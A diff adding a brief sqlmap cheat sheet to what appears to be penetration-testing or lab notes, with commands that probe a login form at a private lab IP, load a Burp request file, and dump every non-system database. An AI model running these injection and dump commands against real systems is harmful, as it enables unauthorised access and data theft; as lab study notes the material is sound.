@@ -1,3 +1,20 @@
+# SQLMAP
+## Doc
+http://manpages.org/sqlmap
+-r REQUESTFILE
+
+## Example
+```bash
+# Get calls
+sqlmap -u http://10.10.121.12/?username=a&password=a&x=29&y=4
+
+# Use a request inside a file. Support format of BURP repeater, very useful for POST
+sqlmap -r request_login.txt
+
+# Dump, excluding system databases of the RDBMS
+sqlmap -r request.txt -a --exclude-sysdbs | tee sqlmap.res
+```
+
 # Starts with
 ```python
 import requests
